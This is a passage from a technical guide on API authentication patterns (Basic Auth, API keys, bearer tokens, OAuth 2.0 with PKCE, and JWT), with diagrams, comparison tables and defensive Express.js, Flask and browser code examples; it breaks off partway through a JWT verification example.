# Authentication Patterns

> Authentication is the cornerstone of API security. Gain a systematic understanding of the mechanisms, security characteristics, and selection criteria for each authentication method — Basic Auth, API Key, Bearer Token, OAuth 2.0, JWT, and PKCE — and design an appropriate authentication architecture based on your requirements.

## What You Will Learn

- [ ] Understand the mechanisms and comparisons of major authentication methods (Basic Auth, API Key, Bearer Token, OAuth 2.0, JWT, PKCE)
- [ ] Understand each OAuth 2.0 flow and its security considerations
- [ ] Learn the internal structure of JWT and how to operate it securely
- [ ] Understand why PKCE is required for SPA/mobile apps
- [ ] Understand anti-patterns and edge cases for each authentication pattern
- [ ] Be able to select the appropriate authentication method based on requirements

---

## Prerequisites

- Understanding of HTTP headers and status codes → See: HTTP Basics
- REST API design principles → See: [REST Best Practices](../01-rest-and-graphql/00-rest-best-practices.md)
- Basic knowledge of cryptography (hashing, public-key cryptography) → See: Security Basics

---

## 1. Fundamentals of Authentication and Authorization

Authentication (AuthN) and Authorization (AuthZ) are often confused, but they are clearly distinct concepts.

```
Difference Between Authentication and Authorization:

  Authentication (AuthN):
  ┌─────────────────────────────────────────────┐
  │  "Who are you?"                              │
  │  → The process of verifying the identity    │
  │    of a user or system                      │
  │  → Result: Identity                         │
  │  Examples: password verification,           │
  │    certificate verification, biometrics     │
  └─────────────────────────────────────────────┘

  Authorization (AuthZ):
  ┌─────────────────────────────────────────────┐
  │  "What are you allowed to do?"              │
  │  → The process of determining permissions  │
  │    for an authenticated user               │
  │  → Result: Permission (granted/denied)     │
  │  Examples: role-based access control,      │
  │    scope verification                      │
  └─────────────────────────────────────────────┘

  Processing Order:

  Client ──request──→ [AuthN] ──→ [AuthZ] ──→ Resource
                          │            │
                          │            └─ 403 Forbidden
                          └─ 401 Unauthorized
```

In API design, separating authentication and authorization is important for maintainability and extensibility. Authentication focuses solely on verifying the identity of the requester, while authorization focuses on determining whether access to a resource is permitted. This separation ensures that changes to the authentication method do not affect the authorization logic, and vice versa.

### 1.1 Overall Classification of Authentication Methods

API authentication methods can be broadly classified into the following categories.

```
Classification of API Authentication Methods:

  ┌─────────────────────────────────────────────────────────────┐
  │                   API Authentication Methods                 │
  ├─────────────┬──────────────┬──────────────┬────────────────┤
  │ Knowledge-  │ Token-based  │ Certificate- │ Delegation-    │
  │ based       │              │ based        │ based          │
  │             │              │              │                │
  │ · Basic     │ · API Key    │ · mTLS       │ · OAuth 2.0    │
  │   Auth      │ · Bearer     │ · Client     │ · OpenID       │
  │ · Digest    │   Token      │   Certificate│   Connect      │
  │   Auth      │ · JWT        │              │ · SAML         │
  │             │ · HMAC sig.  │              │                │
  ├─────────────┴──────────────┴──────────────┴────────────────┤
  │ Security strength:  Low ──────────────────────────────→ High │
  │ Implementation complexity: Low ──────────────────────→ High  │
  └─────────────────────────────────────────────────────────────┘
```

---

## 2. Detailed Comparison of Authentication Methods

### 2.1 Comprehensive Comparison Table

The following table compares major authentication methods across multiple evaluation axes.

```
                Basic Auth  API Key    Bearer Token  OAuth 2.0   JWT       mTLS
────────────────────────────────────────────────────────────────────────────────
Use case        Internal/   Server-to- Mobile/SPA   3rd party   Stateless  Server-to-
                Dev         server                              auth       server
Security        Low         Low–Med    Medium        High        High       Highest
Impl. cost      Lowest      Low        Medium        High        Med–High   High
User auth       Yes         No         Yes           Yes         Yes        No
Scope control   No          Limited    Yes           Detailed    Yes        None
Expiry mgmt.    None        Long/None  Short         Short+renew Short      Cert expiry
Stateless       No          Yes        Depends       Depends     Yes        Yes
Replay attack   Low         Low        Medium        High        Med–High   High
  resistance
Use case        Dev env.    Internal   Internal app  External    Micro-SVCs Finance/
                            API                      integration            Medical
────────────────────────────────────────────────────────────────────────────────
```

### 2.2 Detailed Security Characteristics Comparison

```
Security Characteristics Comparison:

                        Basic Auth  API Key  OAuth 2.0  JWT     mTLS
─────────────────────────────────────────────────────────────────────
Credential exposure risk  High      Med      Low        Low     Lowest
MITM attack resistance    Low*      Low*     High       Med     Highest
Replay attack resistance  Low       Low      High**     Med     High
CSRF attack resistance    Low       High     High       High    High
XSS-based exposure risk   Med       High     Low***     Med     None
Credential revocability   Difficult Easy     Easy       Difficult**** N/A
MFA integration           Difficult No       Easy       No      Possible
─────────────────────────────────────────────────────────────────────

* Improves to Medium–High when using HTTPS
** When using state/nonce parameters
*** For Authorization Code Flow
**** JWT cannot be invalidated before expiry (except with a blacklist approach)
```

---

## 3. Basic Authentication

### 3.1 Mechanism

Basic Auth is the simplest authentication method defined in the HTTP standard (RFC 7617). It encodes the username and password in Base64 and includes them in the request header.

```
Basic Auth Flow:

  Client                                Server
     │                                    │
     │  GET /api/resource                 │
     │ ──────────────────────────────── → │
     │                                    │
     │  401 Unauthorized                  │
     │  WWW-Authenticate: Basic realm="API" │
     │ ←────────────────────────────────  │
     │                                    │
     │  GET /api/resource                 │
     │  Authorization: Basic dXNlcjpwYXNz │
     │ ──────────────────────────────── → │
     │                                    │
     │     Base64 decode                  │
     │     Retrieve "user:pass"           │
     │     Verify credentials             │
     │                                    │
     │  200 OK                            │
     │  { "data": "..." }                │
     │ ←────────────────────────────────  │

  Encoding format:
    Authorization: Basic BASE64(username:password)
    Example: user:pass → dXNlcjpwYXNz
```

### 3.2 Implementation Example

```javascript
// Server side: Basic Auth middleware (Express.js)
function basicAuthMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="API"');
    return res.status(401).json({
      type: 'https://api.example.com/errors/unauthorized',
      title: 'Authentication Required',
      status: 401,
      detail: 'Basic authentication credentials are required.',
    });
  }

  // Base64 decode
  const base64Credentials = authHeader.substring(6);
  const credentials = Buffer.from(base64Credentials, 'base64').toString('utf-8');
  const [username, password] = credentials.split(':');

  // Constant-time comparison to prevent timing attacks
  const expectedUsername = process.env.API_USERNAME;
  const expectedPassword = process.env.API_PASSWORD;

  const usernameMatch = crypto.timingSafeEqual(
    Buffer.from(username.padEnd(256)),
    Buffer.from(expectedUsername.padEnd(256))
  );
  const passwordMatch = crypto.timingSafeEqual(
    Buffer.from(password.padEnd(256)),
    Buffer.from(expectedPassword.padEnd(256))
  );

  if (!usernameMatch || !passwordMatch) {
    return res.status(401).json({
      type: 'https://api.example.com/errors/invalid-credentials',
      title: 'Invalid Credentials',
      status: 401,
      detail: 'The provided username or password is incorrect.',
    });
  }

  req.authenticatedUser = username;
  next();
}

// Usage example
app.get('/api/v1/health', basicAuthMiddleware, (req, res) => {
  res.json({ status: 'ok', authenticatedAs: req.authenticatedUser });
});
```

```python
# Basic Auth implementation in Python (Flask)
import hmac
import base64
from functools import wraps
from flask import Flask, request, jsonify

app = Flask(__name__)

def require_basic_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization

        if not auth:
            return jsonify({
                'error': 'Authentication required',
                'detail': 'Basic authentication credentials are required.'
            }), 401, {'WWW-Authenticate': 'Basic realm="API"'}

        # Constant-time comparison to prevent timing attacks
        expected_user = app.config['API_USERNAME']
        expected_pass = app.config['API_PASSWORD']

        user_valid = hmac.compare_digest(auth.username, expected_user)
        pass_valid = hmac.compare_digest(auth.password, expected_pass)

        if not (user_valid and pass_valid):
            return jsonify({
                'error': 'Invalid credentials',
                'detail': 'The provided username or password is incorrect.'
            }), 401

        request.authenticated_user = auth.username
        return f(*args, **kwargs)
    return decorated

@app.route('/api/v1/health')
@require_basic_auth
def health_check():
    return jsonify({'status': 'ok', 'user': request.authenticated_user})
```

### 3.3 Caveats for Basic Auth

Basic Auth has several critical limitations.

1. **Base64 is encoding, not encryption**: Anyone can decode it, so without HTTPS credentials flow as plaintext
2. **Credentials are sent with every request**: High risk of exposure
3. **No logout mechanism**: The browser caches credentials, making it difficult to end a session
4. **Must be combined with rate limiting**: Additional measures against brute-force attacks are required separately

Basic Auth should be limited to temporary authentication in development environments or CI/CD pipelines, or simple authentication for internal APIs.

---

## 4. API Key

### 4.1 Mechanism and Design

An API Key is a string token issued by the server to identify clients. It is suitable for application authentication rather than user authentication.

```
How API Keys Work:

  Issuance Flow:
  ┌──────────┐    Key issuance request     ┌──────────────┐
  │          │ ─────────────────────────→  │              │
  │Developer │                             │Admin Console │
  │          │ ←─────────────────────────  │              │
  └──────────┘    sk_live_abc123           └──────────────┘
                                                 │
                                           Hash and store
                                                 │
                                           ┌──────────────┐
                                           │  Database    │
                                           │  hash: a1b2c3│
                                           │  scope: read │
                                           │  rate: 1000/h│
                                           └──────────────┘

  Authentication Flow:
  ┌──────────┐    Authorization: Bearer sk_live_abc123    ┌──────────┐
  │          │ ─────────────────────────────────────────→ │          │
  │  Client  │                                            │  API     │
  │          │ ←───────────────────────────────────────── │  Server  │
  └──────────┘           200 OK / 401 Unauthorized        └──────────┘
                                                               │
                                                          SHA-256(key)
                                                          DB lookup
                                                          Scope check
                                                          Rate limit check

  Header Transmission Methods (common patterns):
    Pattern 1: Authorization: Bearer sk_live_abc123
    Pattern 2: X-API-Key: sk_live_abc123
    Pattern 3: ?api_key=sk_live_abc123 (not recommended: remains in URL)

  Key Naming Convention (Stripe style):
    sk_live_xxx  → Production secret key (server side only)
    sk_test_xxx  → Test secret key
    pk_live_xxx  → Production public key (client side OK)
    pk_test_xxx  → Test public key

  Security Requirements:
    [Required] Transmit over HTTPS only
    [Required] Use on server side only (do not expose to clients)
    [Required] Manage via environment variables (do not hardcode in source)
    [Recommended] Provide key rotation functionality
    [Recommended] Set scopes/permissions per key
    [Prohibited] Do not embed in browsers/mobile apps
    [Prohibited] Do not send in URL query parameters (will appear in access logs)
```

### 4.2 Implementation Example

```javascript
// Server side: API Key validation (Express.js)
import crypto from 'crypto';

async function authenticateApiKey(req, res, next) {
  // Support multiple header formats
  const apiKey = req.headers['authorization']?.replace('Bearer ', '')
                 || req.headers['x-api-key'];

  if (!apiKey) {
    return res.status(401).json({
      type: 'https://api.example.com/errors/unauthorized',
      title: 'Authentication Required',
      status: 401,
      detail: 'API key is missing. Include it in the Authorization header.',
    });
  }

  // Key format validation (prefix check)
  if (!/^(sk|pk)_(live|test)_[a-zA-Z0-9]{24,}$/.test(apiKey)) {
    return res.status(401).json({
      type: 'https://api.example.com/errors/invalid-api-key-format',
      title: 'Invalid API Key Format',
      status: 401,
      detail: 'The API key format is invalid.',
    });
  }

  // Search by hash (do not store plaintext)
  const hashedKey = crypto.createHash('sha256').update(apiKey).digest('hex');
  const keyRecord = await db.apiKeys.findOne({
    hash: hashedKey,
    revokedAt: null,
  });

  if (!keyRecord) {
    return res.status(401).json({
      type: 'https://api.example.com/errors/invalid-api-key',
      title: 'Invalid API Key',
      status: 401,
      detail: 'The provided API key is invalid or has been revoked.',
    });
  }

  // Prevent production access with test keys
  if (apiKey.includes('_test_') && process.env.NODE_ENV === 'production') {
    return res.status(403).json({
      type: 'https://api.example.com/errors/test-key-in-production',
      title: 'Test Key Not Allowed',
      status: 403,
      detail: 'Test API keys cannot be used in the production environment.',
    });
  }

  // Update last used timestamp
  await db.apiKeys.updateOne(
    { hash: hashedKey },
    { $set: { lastUsedAt: new Date() } }
  );

  req.apiKey = keyRecord;
  req.account = await db.accounts.findOne({ id: keyRecord.accountId });
  next();
}

// Issue an API Key
async function issueApiKey(accountId, options = {}) {
  const prefix = options.isPublic ? 'pk' : 'sk';
  const env = options.isTest ? 'test' : 'live';

  // Generate a cryptographically secure random string
  const randomPart = crypto.randomBytes(32).toString('base64url');
  const apiKey = `${prefix}_${env}_${randomPart}`;

  // Hash and store (do not store plaintext)
  const hashedKey = crypto.createHash('sha256').update(apiKey).digest('hex');

  await db.apiKeys.insertOne({
    hash: hashedKey,
    prefix: `${prefix}_${env}_${randomPart.substring(0, 4)}`,
    accountId,
    scopes: options.scopes || ['read'],
    rateLimit: options.rateLimit || 1000,
    createdAt: new Date(),
    expiresAt: options.expiresAt || null,
    revokedAt: null,
    lastUsedAt: null,
  });

  // Return plaintext key only at issuance time (not retrievable afterward)
  return {
    key: apiKey,
    prefix: `${prefix}_${env}_${randomPart.substring(0, 4)}...`,
    scopes: options.scopes || ['read'],
    expiresAt: options.expiresAt || null,
  };
}
```

### 4.3 API Key Rotation

Regular rotation (periodic renewal) of API keys is essential for secure operation.

```javascript
// API Key rotation implementation
async function rotateApiKey(accountId, oldKeyPrefix) {
  // Find the old key
  const oldKeyRecord = await db.apiKeys.findOne({
    accountId,
    prefix: { $regex: `^${oldKeyPrefix}` },
    revokedAt: null,
  });

  if (!oldKeyRecord) {
    throw new Error('Active API key not found');
  }

  // Issue a new key
  const newKey = await issueApiKey(accountId, {
    scopes: oldKeyRecord.scopes,
    rateLimit: oldKeyRecord.rateLimit,
  });

  // Set a grace period on the old key (invalidate after 24 hours)
  const gracePeriod = new Date(Date.now() + 24 * 60 * 60 * 1000);
  await db.apiKeys.updateOne(
    { _id: oldKeyRecord._id },
    {
      $set: {
        deprecatedAt: new Date(),
        revokedAt: gracePeriod,
      },
    }
  );

  return {
    newKey: newKey.key,
    oldKeyRevokedAt: gracePeriod,
    message: 'Old key will remain valid for 24 hours.',
  };
}
```

---

## 5. Bearer Token

### 5.1 Mechanism

A Bearer Token (RFC 6750) grants access to whoever presents ("bears") the token. Because the token itself functions as credentials, protecting the token is of utmost importance.

```
Bearer Token Flow:

  ┌──────────┐                    ┌──────────────┐                ┌──────────┐
  │          │  1. Auth request   │              │                │          │
  │          │ ────────────────→  │              │                │          │
  │          │                    │     Auth     │                │          │
  │  Client  │  2. Bearer Token   │    Server    │                │ Resource │
  │          │ ←──────────────── │              │                │  Server  │
  │          │                    └──────────────┘                │          │
  │          │                                                     │          │
  │          │  3. Authorization: Bearer <token>                   │          │
  │          │ ──────────────────────────────────────────────────→ │          │
  │          │                                                     │          │
  │          │  4. Resource response                               │          │
  │          │ ←────────────────────────────────────────────────── │          │
  └──────────┘                                                     └──────────┘

  Bearer Token Characteristics:
    · Works with any token type (JWT, random string, etc.)
    · Anyone with the token can access the resource (= protect against leakage)
    · HTTPS is required (plaintext communication will be intercepted)
    · Standard to send in the Authorization header
```

### 5.2 Opaque Token vs JWT

Bearer Token implementations fall into two major categories.

```
Opaque Token vs JWT:

  Opaque Token:
  ┌─────────────────────────────────────────────┐
  │  Example: "at_x7k2m9p3q8r1"                 │
  │                                             │
  │  · Random string (carries no meaning)       │
  │  · Validation requires DB or cache lookup   │
  │  · Can be invalidated immediately           │
  │  · No information can be read from token    │
  │  · Requires server-side state               │
  └─────────────────────────────────────────────┘

  JWT (Self-contained Token):
  ┌─────────────────────────────────────────────┐
  │  Example: "eyJhbGciOiJSUzI1NiIs..."         │
  │                                             │
  │  · Signed JSON payload                      │
  │  · Can be validated locally (with public key)│
  │  · Difficult to invalidate before expiry    │
  │  · Can include claims (data) in payload     │
  │  · Stateless (no DB lookup needed)          │
  └─────────────────────────────────────────────┘

  Choosing Between Them:
    Opaque Token → When immediate token invalidation is required
    JWT          → Stateless authentication between microservices
```

---

## 6. OAuth 2.0

### 6.1 Overview and Design Philosophy

OAuth 2.0 (RFC 6749) is a framework for delegating authorization. It allows third-party applications to access resources "on behalf of" the user.

An important distinction: OAuth 2.0 is an authorization protocol, not an authentication protocol. To perform authentication, OpenID Connect must be layered on top.

### 6.2 Roles

```
The Four Roles in OAuth 2.0:

  ┌────────────────────────────────────────────────────────┐
  │                                                        │
  │  Resource Owner                                        │
  │  → The owner of the resource. Typically the end user  │
  │  Example: A Google account user                       │
  │                                                        │
  │  Client                                                │
  │  → The application that wants to access the resource  │
  │  Example: A task management app integrating with      │
  │    Google Calendar                                    │
  │                                                        │
  │  Authorization Server                                  │
  │  → The server that issues tokens                      │
  │  Example: Google OAuth Server                         │
  │                                                        │
  │  Resource Server                                       │
  │  → The server that provides the protected resource    │
  │  Example: Google Calendar API                         │
  │                                                        │
  └────────────────────────────────────────────────────────┘
```

### 6.3 Authorization Code Flow (Recommended: Web Apps)

This is the most secure and recommended flow.

```
Authorization Code Flow:

  Resource    Client         Authorization     Resource
  Owner       (Web App)       Server            Server
    │           │               │                 │
    │  1. Click "Login with Google"               │
    │ ────────→ │               │                 │
    │           │               │                 │
    │           │  2. Authorization request (redirect)
    │ ←──────── │               │                 │
    │           │               │                 │
    │  3. Redirect to authorization server        │
    │ ─────────────────────────→ │                │
    │           │               │                 │
    │  4. Login / consent screen │                 │
    │ ←─────────────────────── │                  │
    │           │               │                 │
    │  5. User grants consent   │                  │
    │ ─────────────────────────→ │                │
    │           │               │                 │
    │  6. Redirect with authorization code        │
    │ ←─────────────────────── │                  │
    │ ────────→ │               │                 │
    │           │               │                 │
    │           │  7. Auth code + client_secret   │
    │           │ ────────────→ │                 │
    │           │               │                 │
    │           │  8. access_token + refresh_token│
    │           │ ←──────────── │                 │
    │           │               │                 │
    │           │  9. API request (Bearer token)  │
    │           │ ──────────────────────────────→ │
    │           │               │                 │
    │           │  10. Resource response          │
    │           │ ←────────────────────────────── │
    │           │               │                 │

  Key Points:
  · The authorization code is passed via the front channel (browser)
  · Token exchange is performed via the back channel (server-to-server)
  · The client_secret is stored securely on the server side
```

```javascript
// Authorization Code Flow implementation (Express.js)
import express from 'express';
import crypto from 'crypto';

const app = express();

const OAUTH_CONFIG = {
  clientId: process.env.OAUTH_CLIENT_ID,
  clientSecret: process.env.OAUTH_CLIENT_SECRET,
  authorizationEndpoint: 'https://auth.example.com/authorize',
  tokenEndpoint: 'https://auth.example.com/oauth/token',
  redirectUri: 'https://app.example.com/callback',
  scopes: ['users:read', 'orders:read'],
};

// Step 1: Initiate the authorization request
app.get('/auth/login', (req, res) => {
  // Generate a state parameter for CSRF prevention
  const state = crypto.randomBytes(32).toString('hex');
  req.session.oauthState = state;

  const params = new URLSearchParams({
    response_type: 'code',
    client_id: OAUTH_CONFIG.clientId,
    redirect_uri: OAUTH_CONFIG.redirectUri,
    scope: OAUTH_CONFIG.scopes.join(' '),
    state: state,
  });

  res.redirect(`${OAUTH_CONFIG.authorizationEndpoint}?${params}`);
});

// Step 2: Handle the callback
app.get('/callback', async (req, res) => {
  const { code, state, error } = req.query;

  // Check for error
  if (error) {
    return res.status(400).json({
      error: 'OAuth error',
      detail: req.query.error_description || error,
    });
  }

  // Validate the state parameter (CSRF prevention)
  if (state !== req.session.oauthState) {
    return res.status(403).json({
      error: 'Invalid state',
      detail: 'State parameter mismatch. Possible CSRF attack.',
    });
  }
  delete req.session.oauthState;

  // Step 3: Exchange the authorization code for a token
  const tokenResponse = await fetch(OAUTH_CONFIG.tokenEndpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      redirect_uri: OAUTH_CONFIG.redirectUri,
      client_id: OAUTH_CONFIG.clientId,
      client_secret: OAUTH_CONFIG.clientSecret,
    }),
  });

  if (!tokenResponse.ok) {
    const errorData = await tokenResponse.json();
    return res.status(400).json({
      error: 'Token exchange failed',
      detail: errorData.error_description || 'Failed to exchange code for token.',
    });
  }

  const tokens = await tokenResponse.json();
  // {
  //   access_token: "eyJhbG...",
  //   token_type: "Bearer",
  //   expires_in: 3600,
  //   refresh_token: "rt_abc...",
  //   scope: "users:read orders:read"
  // }

  // Store tokens in session
  req.session.accessToken = tokens.access_token;
  req.session.refreshToken = tokens.refresh_token;
  req.session.tokenExpiresAt = Date.now() + tokens.expires_in * 1000;

  res.redirect('/dashboard');
});
```

### 6.4 Authorization Code + PKCE (Recommended: SPA/Mobile)

PKCE (Proof Key for Code Exchange, RFC 7636) is an extension that prevents authorization code interception attacks for public clients (SPAs and mobile apps).

```
PKCE Mechanism:

  Why PKCE Is Necessary:
  ┌──────────────────────────────────────────────────────────┐
  │ SPA/mobile apps cannot securely store a client_secret    │
  │                                                          │
  │ Problem: If the authorization code is intercepted:       │
  │                                                          │
  │   Legitimate app → Auth server → Auth code → [intercepted] → Attacker │
  │                                                          │
  │   The attacker can use the auth code to obtain tokens    │
  │                                                          │
  │ PKCE Solution:                                           │
  │   Make the auth code alone insufficient                  │
  │   → Only the app that holds the code_verifier (secret    │
  │     value) can exchange the code for tokens              │
  └──────────────────────────────────────────────────────────┘

  PKCE Flow:

  1. Client generates a random code_verifier (43–128 characters)
     code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"

  2. Compute code_challenge
     code_challenge = BASE64URL(SHA256(code_verifier))
     code_challenge = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

  3. Include code_challenge in the authorization request
     GET /authorize?
       response_type=code&
       client_id=client_123&
       redirect_uri=https://app.example.com/callback&
       scope=openid profile&
       state=xyz&
       code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&
       code_challenge_method=S256

  4. Include code_verifier in the token exchange
     POST /oauth/token
     {
       "grant_type": "authorization_code",
       "code": "auth_code_xxx",
       "redirect_uri": "https://app.example.com/callback",
       "client_id": "client_123",
       "code_verifier": "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
     }

  5. Authorization server validates
     SHA256(code_verifier) == code_challenge ?
     → If match: issue token
     → If mismatch: reject
```

```javascript
// PKCE implementation for SPA
class OAuthPKCEClient {
  constructor(config) {
    this.config = config;
  }

  // Generate code_verifier (random string of 43–128 characters)
  generateCodeVerifier() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return this.base64UrlEncode(array);
  }

  // Compute code_challenge
  async generateCodeChallenge(verifier) {
    const encoder = new TextEncoder();
    const data = encoder.encode(verifier);
    const digest = await crypto.subtle.digest('SHA-256', data);
    return this.base64UrlEncode(new Uint8Array(digest));
  }

  // Base64URL encode
  base64UrlEncode(buffer) {
    return btoa(String.fromCharCode(...buffer))
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=+$/, '');
  }

  // Start the authorization request
  async startAuthorization() {
    const codeVerifier = this.generateCodeVerifier();
    const codeChallenge = await this.generateCodeChallenge(codeVerifier);
    const state = crypto.randomUUID();

    // Store code_verifier and state in sessionStorage
    sessionStorage.setItem('pkce_code_verifier', codeVerifier);
    sessionStorage.setItem('oauth_state', state);

    const params = new URLSearchParams({
      response_type: 'code',
      client_id: this.config.clientId,
      redirect_uri: this.config.redirectUri,
      scope: this.config.scopes.join(' '),
      state: state,
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
    });

    window.location.href =
      `${this.config.authorizationEndpoint}?${params}`;
  }

  // Handle callback (token exchange)
  async handleCallback() {
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    const state = params.get('state');
    const error = params.get('error');

    if (error) {
      throw new Error(`OAuth error: ${params.get('error_description') || error}`);
    }

    // Validate state
    const savedState = sessionStorage.getItem('oauth_state');
    if (state !== savedState) {
      throw new Error('State mismatch: possible CSRF attack');
    }

    // Retrieve code_verifier
    const codeVerifier = sessionStorage.getItem('pkce_code_verifier');
    if (!codeVerifier) {
      throw new Error('Code verifier not found');
    }

    // Clean up sessionStorage
    sessionStorage.removeItem('oauth_state');
    sessionStorage.removeItem('pkce_code_verifier');

    // Token exchange
    const response = await fetch(this.config.tokenEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: this.config.redirectUri,
        client_id: this.config.clientId,
        code_verifier: codeVerifier,
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(
        `Token exchange failed: ${errorData.error_description || errorData.error}`
      );
    }

    return response.json();
  }
}

// Usage example
const oauth = new OAuthPKCEClient({
  clientId: 'spa_client_123',
  authorizationEndpoint: 'https://auth.example.com/authorize',
  tokenEndpoint: 'https://auth.example.com/oauth/token',
  redirectUri: 'https://spa.example.com/callback',
  scopes: ['openid', 'profile', 'email'],
});

// On login button click
document.getElementById('loginBtn').addEventListener('click', () => {
  oauth.startAuthorization();
});

// Callback page
if (window.location.pathname === '/callback') {
  oauth.handleCallback()
    .then(tokens => {
      console.log('Login successful:', tokens);
      // Keep access_token in memory (do not store in localStorage)
    })
    .catch(error => {
      console.error('Login failed:', error);
    });
}
```

### 6.5 Client Credentials Flow (Server-to-Server)

This flow is used for server-to-server communication without user involvement.

```javascript
// Client Credentials Flow implementation
async function getServiceToken() {
  const response = await fetch('https://auth.example.com/oauth/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      client_id: process.env.SERVICE_CLIENT_ID,
      client_secret: process.env.SERVICE_CLIENT_SECRET,
      scope: 'internal:admin',
    }),
  });

  if (!response.ok) {
    throw new Error(`Token request failed: ${response.status}`);
  }

  return response.json();
}

// Client with token caching
class ServiceAuthClient {
  constructor() {
    this.token = null;
    this.expiresAt = 0;
  }

  async getToken() {
    // Check token expiry with a 5-minute buffer
    if (this.token && Date.now() < this.expiresAt - 5 * 60 * 1000) {
      return this.token;
    }

    const tokenData = await getServiceToken();
    this.token = tokenData.access_token;
    this.expiresAt = Date.now() + tokenData.expires_in * 1000;

    return this.token;
  }

  async authenticatedFetch(url, options = {}) {
    const token = await this.getToken();
    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${token}`,
      },
    });
  }
}
```

### 6.6 Implicit Flow (Deprecated)

The Implicit Flow was once designed for browser-based applications, but is now deprecated for security reasons.

```
Why Implicit Flow Is Deprecated:

  Implicit Flow:
    Authorization request → access_token is returned directly in the URL fragment
    Example: https://app.example.com/callback#access_token=xxx&token_type=Bearer

  Problems:
  1. access_token remains in the browser history
  2. Can be leaked via the Referer header
  3. Token validation is performed on the client side,
     making it vulnerable to Token Substitution Attacks
  4. No refresh_token is issued, so the user must re-authenticate
     when the token expires

  Recommended Alternative:
    Authorization Code Flow + PKCE
    → PKCE should be used for all public clients
    → Implicit Flow is scheduled for removal in the OAuth 2.1 draft
```

---

## 7. JWT (JSON Web Token)

### 7.1 Structural Details

JWT (RFC 7519) is a compact token format for securely transmitting information between parties as JSON.

```
JWT Structure (Three Parts):

  eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyXzEyMyJ9.SflKxwRJSMeKKF2QT4fw...
  ├─── Header ───┤├──── Payload ────┤├──── Signature ────┤

  Each part is Base64URL encoded and concatenated with dots (.)

  ┌─────────────────────────────────────────────────────────┐
  │ Header                                                  │
  │ Declares the algorithm and token type                   │
  │                                                         │
  │ {                                                       │
  │   "alg": "RS256",        ← Signing algorithm            │
  │   "typ": "JWT",          ← Token type                   │
  │   "kid": "key_2024_01"   ← Key ID                       │
  │ }                                                       │
  ├─────────────────────────────────────────────────────────┤
  │ Payload (Claims)                                        │
  │ Data included in the token                              │
  │                                                         │
  │ Registered Claims:                                      │
  │ {                                                       │
  │   "iss": "https://auth.example.com",  ← Issuer         │
  │   "sub": "user_123",                  ← Subject         │
  │   "aud": "https://api.example.com",   ← Audience        │
  │   "exp": 1700000000,                  ← Expiration time │
  │   "iat": 1699996400,                  ← Issued at       │
  │   "nbf": 1699996400,                  ← Not before      │
  │   "jti": "unique_token_id"            ← JWT ID          │
  │ }                                                       │
  │                                                         │
  │ Public Claims:                                          │
  │ {                                                       │
  │   "email": "user@example.com",                          │
  │   "name": "John Doe"                                    │
  │ }                                                       │
  │                                                         │
  │ Private Claims:                                         │
  │ {                                                       │
  │   "scope": "users:read orders:read",                    │
  │   "role": "admin",                                      │
  │   "tenant_id": "org_456"                                │
  │ }                                                       │
  ├─────────────────────────────────────────────────────────┤
  │ Signature                                               │
  │ Detects tampering of header and payload                 │
  │                                                         │
  │ For RS256:                                              │
  │ RSASHA256(                                              │
  │   base64UrlEncode(header) + "." +                       │
  │   base64UrlEncode(payload),                             │
  │   privateKey                                            │
  │ )                                                       │
  └─────────────────────────────────────────────────────────┘
```

### 7.2 Choosing a Signing Algorithm

```
Signing Algorithm Comparison:

  Algorithm  Type          Key Length  Use Case           Performance
  ──────────────────────────────────────────────────────────────────
  HS256      Symmetric     256 bit     Single service     Fastest
  HS384      Symmetric     384 bit     Single service     Fast
  HS512      Symmetric     512 bit     Single service     Fast
  RS256      Asymmetric    2048 bit    Microservices      Moderate
  RS384      Asymmetric    3072 bit    Microservices      Slow
  RS512      Asymmetric    4096 bit    Microservices      Slow
  ES256      Elliptic Curve 256 bit   Mobile/IoT         Fast
  ES384      Elliptic Curve 384 bit   High security      Moderate
  ES512      Elliptic Curve 521 bit   High security      Moderate
  EdDSA      Edwards Curve 256 bit    Modern systems     Fastest (asymmetric)
  ──────────────────────────────────────────────────────────────────

  Selection Guide:
  ┌──────────────────────────────────────────────────────────────┐
  │ Single server → HS256 (symmetric key, simple)                │
  │ Microservices → RS256 or ES256 (verifiable with public key)  │
  │ Mobile/IoT → ES256 (RSA-equivalent security with shorter key)│
  │ New designs → EdDSA (modern and high-performance; check      │
  │   library support)                                           │
  │                                                              │
  │ [Important] Never allow "alg": "none"                        │
  │ → Vulnerability that accepts unsigned JWTs (CVE-2015-9235)   │
  └──────────────────────────────────────────────────────────────┘
```

### 7.3 JWT Validation Implementation

```javascript
// JWT validation (jose library) - production-quality implementation
import { jwtVerify, createRemoteJWKSet, errors } from 'jose';

// Retrieve public keys from JWKS (JSON Web Key Set)
// The JWKS endpoint is published by the authorization server
const JWKS = createRemoteJWKSet(
  new URL('https://auth.example.com/.well-known/jwks.json'),
  {
    cooldownDuration: 30000,  // 30-second cooldown (prevent consecutive requests)
    cacheMaxAge: 600000,      // 10-minute cache
  }
);

async function verifyToken(token) {
  try {
    const { payload, protectedHeader } = await jwtVerify(token, JWKS, {
      issuer: 'https://auth.example.com',
      audience: 'https://api.example.com',
      algorithms: ['RS256', 'ES256'],  // Explicitly specify allowed algorithms
